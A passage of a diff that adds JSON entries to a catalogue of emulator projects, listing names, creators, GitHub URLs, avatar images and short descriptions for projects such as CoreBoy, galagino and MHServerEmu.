+    "url": "https://github.com/AmatCoder/mednaffe",
+    "cover": "https://avatars.githubusercontent.com/u/3890995?v=4",
+    "description": "A front-end (GUI) for mednafen emulator"
+  },
+  {
+    "name": "esplay-retro-emulation",
+    "slug": "esplay-retro-emulation",
+    "creator": "pebri86",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/pebri86/esplay-retro-emulation",
+    "cover": "https://avatars.githubusercontent.com/u/3339304?v=4",
+    "description": "Retro Emulation Collection for ESPlay Hardware, an ESP32 based game console"
+  },
+  {
+    "name": "MHServerEmu",
+    "slug": "mhserveremu",
+    "creator": "Crypto137",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Crypto137/MHServerEmu",
+    "cover": "https://avatars.githubusercontent.com/u/1700701?v=4",
+    "description": "Server emulator for Marvel Heroes"
+  },
+  {
+    "name": "CoreBoy",
+    "slug": "coreboy",
+    "creator": "davidwhitney",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/davidwhitney/CoreBoy",
+    "cover": "https://avatars.githubusercontent.com/u/186470?v=4",
+    "description": "A GameBoy Emulator, in C#"
+  },
+  {
+    "name": "galagino",
+    "slug": "galagino",
+    "creator": "harbaum",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/harbaum/galagino",
+    "cover": "https://avatars.githubusercontent.com/u/9105084?v=4",
+    "description": "A Galaga, Pac-Man and Donkey Kong arcade emulator for the ESP32"
+  },
+  {
+    "name": "Android-3DTouch-PeekView",
+    "slug": "android-3dtouch-peekview",
+    "creator": "klinker24",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/klinker24/Android-3DTouch-PeekView",
+    "cover": "https://avatars.githubusercontent.com/u/4874287?v=4",
+    "description": "Simple and powerful library to emulate iOS's \"3D Touch\" preview functionality on Android."
   }
 ]
